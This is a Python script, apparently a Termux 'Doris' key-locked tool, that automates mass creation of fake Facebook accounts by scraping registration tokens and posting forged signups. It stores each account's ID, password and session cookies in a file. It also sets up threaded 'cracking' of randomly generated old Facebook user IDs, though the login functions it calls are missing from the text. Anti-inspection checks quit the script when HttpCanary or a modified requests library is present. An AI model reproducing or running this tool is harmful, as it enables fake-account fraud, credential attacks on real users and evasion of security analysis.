import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

import os, sys

# Valid keys
approved_keys = ["doris"]

def first_step():
    os.system("clear")
    print("\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\033[1;32m        🔒   HÙNG DƯƠNG TOOL 🔒")
    print("\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    input("\n[↩] NHẤN ENTER ĐỂ NHẬP KEY...")

def check_key():
    user_key = input("\n[?] Enter your key: ")
    if user_key in approved_keys:
        print("\n[✓] Key approved! Script is running...\n")
    else:
        print("\n[×] Invalid key! Dobara Channel par jao.")
        sys.exit()

# First step
first_step()

# Key check
check_key()

# Tool ka main code yahan likho
print(">>> Tool Successfully Unlocked <<<")

# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
import urllib3
from requests.exceptions import ConnectionError
from requests import api, models, sessions
urllib3.disable_warnings()

# Initial setup and promotion
os.system('clear')
print(' \x1b[38;5;46𝐦𝘿𝙊𝙍𝙄𝙎  𝐒𝐄𝐑𝐕𝐄𝐑 𝐋𝐎𝐀𝐃𝐈𝐍𝐆....')
system('espeak -a 500 "WELLCOME TO DORIS KOREA TOOL"')

os.system('pip uninstall -y requests chardet urllib3 idna certifi')
os.system('python -m pip install --upgrade chardet urllib3 idna certifi requests')
os.system('python -m pip install --upgrade httpx beautifulsoup4')
print('loading Modules ...\n')
os.system('clear')

# --- Anti-tampering and Security Checks ---
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass

class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')

# Global variables
method = []
oks = []
cps = []
twf = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m' 

# ==================== BANNER COLORS ====================
RESET  = '\033[0m'
BOLD   = '\033[1m'

RED    = '\033[38;5;196m'
ORANGE = '\033[38;5;208m'
YELLOW = '\033[38;5;226m'
GREEN  = '\033[38;5;46m'
CYAN   = '\033[38;5;51m'
BLUE   = '\033[38;5;39m'
PURPLE = '\033[38;5;129m'
PINK   = '\033[38;5;201m'
WHITE  = '\033[1;37m'
GRAY   = '\033[38;5;245m'
# Color aliases used by banner
R = RR
P = PP
C = GS
RESET = W

# Common menu variables and helpers used by the UI
xp0 = f"{GREEN}0{RESET}"
xp1 = f"{GREEN}1{RESET}"
xp2 = f"{GREEN}2{RESET}"
xp3 = f"{GREEN}3{RESET}"
xp4 = f"{GREEN}4{RESET}"
xp5 = f"{GREEN}5{RESET}"
xp6 = f"{GREEN}6{RESET}"
xp = f"{WHITE}[*]{RESET}"
xpx = f"{WHITE}[?]{RESET}"
xpxx = f"{WHITE}[!]{RESET}"
xpxxx = f"{WHITE}>>{RESET}"
white = WHITE
green = GREEN
red = RED
blue = BLUE

def __LINE__():
    print(f"{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

def __ERRORLOGO__():
    system("clear" if os.name == "posix" else "cls")

# --- Helper functions used by the auto-create flow ---
def extractor(html):
    """Extract the Facebook registration form fields needed by the signup flow."""
    data = {}
    patterns = [
        ('reg_instance', r'name="reg_instance"\s+value="([^"]+)"'),
        ('reg_impression_id', r'name="reg_impression_id"\s+value="([^"]+)"'),
        ('logger_id', r'name="logger_id"\s+value="([^"]+)"'),
        ('fb_dtsg', r'name="fb_dtsg"\s+value="([^"]+)"'),
        ('jazoest', r'name="jazoest"\s+value="([^"]+)"'),
        ('lsd', r'name="lsd"\s+value="([^"]+)"'),
    ]
    for key, pattern in patterns:
        match = re.search(pattern, html or "")
        if match:
            data[key] = match.group(1)
    if not data.get('logger_id'):
        match = re.search(r'"logger_id":"([^"]+)"', html or "")
        if match:
            data['logger_id'] = match.group(1)
    if not data.get('reg_impression_id'):
        match = re.search(r'"reg_impression_id":"([^"]+)"', html or "")
        if match:
            data['reg_impression_id'] = match.group(1)
    return data


def generate_phone_number():
    prefixes = ['905', '906', '907', '908', '909', '910', '912', '915', '916', '917', '918', '919', '920', '921', '922', '923', '924', '925', '926', '927', '928', '929', '930', '931', '932', '933', '934', '935', '936', '937', '938', '939', '940', '941', '942', '943', '944', '945', '946', '947', '948', '949']
    return f"{random.choice(prefixes)}{random.randint(1000000, 9999999)}"


def get_pass():
    return random.choice(['Ziya123', 'Password@123', 'Kitty@123', 'Love123', 'Ziya@2024'])


def ethanproxy():
    return None


def ___EthanAutoUa2___():
    uas = [
        'Mozilla/5.0 (Linux; Android 13; RMX3085 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.165 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/479.0.0.27.105;]',
        'Mozilla/5.0 (Linux; Android 14; Pixel 8 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/482.0.0.36.114;]',
        'Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.66 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.31.87;]'
    ]
    return random.choice(uas)


def get_girl_name_ph():
    first = random.choice(['Maria', 'Angela', 'Sophia', 'Ariana', 'Princess', 'Mica', 'Jasmine', 'Rosal', 'Nicole', 'Rhea'])
    last = random.choice(['Dela Cruz', 'Santos', 'Reyes', 'Marquez', 'Valencia', 'Aquino', 'Lorenzo', 'Sanchez', 'Bautista', 'Cruz'])
    return first, last


def get_boy_name_ph():
    first = random.choice(['John', 'Mark', 'Lorenzo', 'Alvin', 'Daniel', 'Miguel', 'Raven', 'Ken', 'Ethan', 'Alden'])
    last = random.choice(['Dela Cruz', 'Santos', 'Reyes', 'Marquez', 'Valencia', 'Aquino', 'Lorenzo', 'Sanchez', 'Bautista', 'Cruz'])
    return first, last


def get_girl_name_nepal():
    first = random.choice(['Aisha', 'Sita', 'Anita', 'Priya', 'Riya', 'Kusum', 'Saru', 'Nisha', 'Nima', 'Shreya'])
    last = random.choice(['Shrestha', 'Thapa', 'Gurung', 'Karki', 'Maharjan', 'Rai', 'Poudel', 'Pandey', 'Tamang', 'Lama'])
    return first, last


def get_boy_name_nepal():
    first = random.choice(['Aashish', 'Nabin', 'Sanjay', 'Prabin', 'Rajesh', 'Rabin', 'Suman', 'Bibek', 'Hemant', 'Arjun'])
    last = random.choice(['Shrestha', 'Thapa', 'Gurung', 'Karki', 'Maharjan', 'Rai', 'Poudel', 'Pandey', 'Tamang', 'Lama'])
    return first, last


def get_girl_name_pakistan():
    first = random.choice(['Ayesha', 'Mahnoor', 'Hira', 'Zara', 'Alina', 'Sana', 'Areeba', 'Sadia', 'Maham', 'Rida'])
    last = random.choice(['Khan', 'Ahmed', 'Ali', 'Malik', 'Shah', 'Nawaz', 'Iqbal', 'Bashir', 'Raza', 'Hussain'])
    return first, last


def get_boy_name_pakistan():
    first = random.choice(['Ahmad', 'Hamza', 'Ali', 'Usman', 'Bilal', 'Zain', 'Hassan', 'Arslan', 'Muhammad', 'Ayan'])
    last = random.choice(['Khan', 'Ahmed', 'Ali', 'Malik', 'Shah', 'Nawaz', 'Iqbal', 'Bashir', 'Raza', 'Hussain'])
    return first, last


def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = "Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]"
    return "Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]"

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

# Set window title
sys.stdout.write('\x1b]2;𓆩【👑DORIS XD👑 】𓆪 \x07')


# API-canary paths used by http_canary(). Some builds define these elsewhere,
# but on decoded scripts they may be absent. Default to common Android paths so
# the function remains safe and the linter no longer reports undefined names.
path_canary = '/storage/emulated/0/Android/data'
path_canary2 = '/data/data'
path_canary3 = '/storage/emulated/0/Android/data'
path_canary4 = '/storage/emulated/0/Android/obb'
path_canary5 = '/data/app'
path_canary6 = '/sdcard/Android/data'
package_name = 'com.guoshi.httpcanary'
package_name2 = 'com.guoshi.httpcanary.pro'
package_name3 = 'com.guoshi.httpcanary.beta'
package_name4 = 'com.guoshi.httpcanary.premium'
package_name5 = 'com.guoshi.httpcanary.apk'
package_name6 = 'com.guoshi.httpcanary.app'
xpxx = '[!]'
xp = '[*]'

#-----------------------( API BYPASS )-----------------------#
def http_canary():
    try:
        if os.path.exists(os.path.join(path_canary,package_name)):
            system("clear" if os.name == "posix" else "cls")
            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
            exit('\n')
        if os.path.exists(os.path.join(path_canary2,package_name2)):
            system("clear" if os.name == "posix" else "cls")
            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
            exit('\n')
        elif os.path.exists(os.path.join(path_canary3,package_name3)):
            system("clear" if os.name == "posix" else "cls")
            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
            exit('\n')
        elif os.path.exists(os.path.join(path_canary4,package_name4)):
            system("clear" if os.name == "posix" else "cls")
            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
            exit('\n')
        elif os.path.exists(os.path.join(path_canary5,package_name5)):
            system("clear" if os.name == "posix" else "cls")
            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
            exit('\n')
        elif os.path.exists(os.path.join(path_canary6,package_name6)):
            system("clear" if os.name == "posix" else "cls")
            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
            exit('\n')
        else:
            pass
    except:
        system("clear" if os.name == "posix" else "cls")
        print(f"{xp} TURN ON STORAGE PERMISSION")
        exit('\n')

#-----------------------( MAIN/MENU )-----------------------#
def __MENU__():
    print(f"{xp1} AUTO CREATE FB ")
    print(f"{xp2} 2FA ")
    print(f"{xp3} COOKIE EXTRACT ")
    print(f"{xp0} EXIT TOOLS ")
    __LINE__()
    __MENUC__=input(f"{xpx} INPUT MENU {xpxxx} ")
    if __MENUC__=="1":
       __AUTOX__()
    elif __MENUC__=="2":__2FAX__()
    elif __MENUC__=="3":__COKIX__()
    elif __MENUC__=="0":__LINE__();print(f"{xp} EXIT SUCCESSFULLY ");time.sleep(1.1);__LINE__();os.system(f"exit")
    else:__LINE__();print(f"{xpxx} INVALID OPTION TRY AGAIN ");time.sleep(1);__MENU__()

#-----------------------( AUTO-MENU )-----------------------#
def __AUTOX__():
    __ERRORLOGO__()
    __NUM__=input(f"{xp} HOW MANY FACEBOOK ACCOUNT LIMIT {xpxxx}︎ ")
    __ERRORLOGO__()
    print(f"{xp1} GIRL NAME PHILIPPINES ")
    print(f"{xp2} BOY NAME PHILIPPINES ")
    print(f"{xp3} GIRL NAME NEPAL ")
    print(f"{xp4} BOY NAME NEPAL ")
    print(f"{xp5} GIRL NAME PAKISTAN ")
    print(f"{xp6} BOY NAME PAKISTAN ")
    __LINE__()
    __NAME__=input(f"{xpx} INPUT NAME {xpxxx} ")
    __ERRORLOGO__()
    print(f"{xp1} FEMALE ")
    print(f"{xp2} MALE ")
    __LINE__()
    __GENDER__=input(f"{xpx} INPUT GENDER {xpxxx} ")
    __ERRORLOGO__()
    print(f"{xp1} AUTO PASSWORD ")
    print(f"{xp2} AUTO PASSWORD WITH NAMENUMBER ")
    print(f"{xp3} AUTO PASSWORD WITH SURNAME ")
    print(f"{xp4} MANUAL CUSTOM PASSWORD ")
    __LINE__()
    __PASS__=input(f"{xpx} INPUT PASSWORD {xpxxx} ")
    if __PASS__=="4":pww=input(f"{xpx} ETHER CUSTOMER PASSWORD {xpxxx} ")
    __ERRORLOGO__()
    print(f"{xp} SHOW ALL DETAILS...? ")
    __LINE__()
    show_details=input(f"{xpx} {white}[{green}Y{white}/{red}N{white}] {xpxxx} ")
    __ERRORLOGO__()
    print(f"{xp} TOTAL NEW ACCOUNT IDS {xpxxx} {__NUM__}")
    print(f"{xp} CREATING ACCOUNT STARTED")
    print(f"{xp} USER 1.1.1 VPN")
    __LINE__()
    for _ in range(int(__NUM__)):
        try:
            global oks,cps
            color=random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r {white}[{green}KITTY-CREATE{white}]-{white}[{green}OK:-%s{white}] '%(len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            ses=requests.Session()
            response=ses.get("https://x.facebook.com/reg")
            form=extractor(response.text)
            if __NAME__=="1":firstname,lastname=get_girl_name_ph()
            elif __NAME__=="2":firstname,lastname=get_boy_name_ph()
            elif __NAME__=="3":firstname,lastname=get_girl_name_nepal()
            elif __NAME__=="4":firstname,lastname=get_boy_name_nepal()
            elif __NAME__=="5":firstname,lastname=get_girl_name_pakistan()
            elif __NAME__=="6":firstname,lastname=get_boy_name_pakistan()
            if __GENDER__=="1":sex,gender="1","Female"
            elif __GENDER__=="2":sex,gender="2","Male"
            if __PASS__=="1":pww=get_pass()
            if __PASS__=="2":pww=f"{firstname.lower()}{random.choice([123,12345,123456,1234567,123456789,1234567890,143,143143,123123])}"
            if __PASS__=="3":pww=f"{firstname.lower()}{lastname.lower()}"
            phone=generate_phone_number()
            payload={'ccp': "2",
            'reg_instance': form.get("reg_instance",""),
            'submission_request': "true",
            'reg_impression_id': form.get("reg_impression_id",""),
            'ns': "1",
            'logger_id': form.get("logger_id",""),
            'firstname': firstname,
            'lastname': lastname,
            'birthday_day': str(random.randint(15,25)),
            'birthday_month': str(random.randint(5,10)),
            'birthday_year': str(random.randint(1985,1995)),
            'reg_email__': phone,
            'sex': sex,
            'encpass': f'#PWD_BROWSER:0:{int(time.time())}:{pww}',
            'submit': "Sign Up",
            'fb_dtsg': form.get("fb_dtsg",""),
            'jazoest': form.get("jazoest",""),
            'lsd': form.get("lsd","")}
            headers={"Host": "m.facebook.com",
            "Connection": "keep-alive",
            "User-Agent": ___EthanAutoUa2___(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9"}
            head1={'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'referer': 'https://mbasic.facebook.com/reg/',
            'sec-ch-ua': '',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ___EthanAutoUa2___()}
            merged_headers={**headers,**head1}
            reg_url="https://www.facebook.com/reg/submit/"
            reg_submit=ses.post(reg_url,data=payload,headers=merged_headers,proxies=ethanproxy())
            login_coki=ses.cookies.get_dict()
            if "c_user" in login_coki:
                coki="sb=Cracked.By-Error_Tool;"+";".join([f"{key}={value}" for key,value in login_coki.items()])
                uid=login_coki["c_user"]
                if show_details=='y':
                    print(f"\r{xp} NAME     {xpxxx} {firstname} {lastname}\033[1;37m")
                    print(f"\r{xp} NUMBER   {xpxxx} {phone}\033[1;37m")
                    print(f"\r{xp} GENDER   {xpxxx} {gender}\033[1;37m")
                    print(f"\r{xp} BIRTHDAY {xpxxx} {payload['birthday_day']}-{payload['birthday_month']}-{payload['birthday_year']}\033[1;37m")
                    print(f"\r{xp} UID      {xpxxx} {uid}\033[1;37m")
                    print(f"\r{xp} PASS     {xpxxx} {pww}\033[1;37m")
                    print(f"\r{xp} COOKIE   {xpxxx} {coki}\033[1;37m")
                    __LINE__()
                else:
                    print(f'\r{green} [DORIS-XD-OK] '+uid+' | '+pww+'\033[1;97m') # type: ignore
                open('/sdcard/download/DORIS-XD-OK.txt', 'a').write(uid+'|'+pww+'|'+coki+'\n') # type: ignore
                oks.append(uid)
            elif "checkpoint" in login_coki:
                uid=login_coki.get("c_user","unknown")
                cps.append(uid)
            time.sleep(1)
        except Exception as e:pass
    print("\033[1;37m")
    __LINE__()
    print(f"{xp} THE PROCESS HAS COMPLETED...!")
    __LINE__()
    print(f"{xp} {green}TOTAL OK {xpxxx} {len(oks)}")
    print(f"{xp} {red}TOTAL CP {xpxxx} {len(cps)}")
    print(f"{xp} {blue}TOTAL 2F {xpxxx} {len(twf)}")
    __LINE__()
    print(f"{xp} THANKS FOR USING.....! ")
    __LINE__()
    exit()

#-----------------------( 2FA-MENU )-----------------------#
def __2FAX__():
    print(f"{xp} COMING SOON")
    exit()

#-----------------------( COKI-MENU )-----------------------#
def __COKIX__():
    print(f"{xp} COMING SOON")
    exit()

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '100003', '1000004')):
            return '2009'
        if uid.startswith(('1000005', '1000006', '1000007', '1000008', '100009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''

def clear():
    os.system('clear')

def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

# Backward-compatible banner helper used by the legacy menu flow.
def ____banner____():
    system('clear' if os.name == 'posix' else 'cls')
    print(f"{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    print(f"{Y}        DORIS KOREA TOOL{W}")
    print(f"{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")

def BNG_71_():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD ACCOUNT TOOL')
    linex()
    __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()

def old_clone():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mALL SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m100003/4 SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m2009 series')
    linex()
    _input = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(f"\n[×]{rad} Choose Value Option... ")
        BNG_71_()

def old_One():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOld Code {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def old_Tow():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def old_Tree():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
    linex()
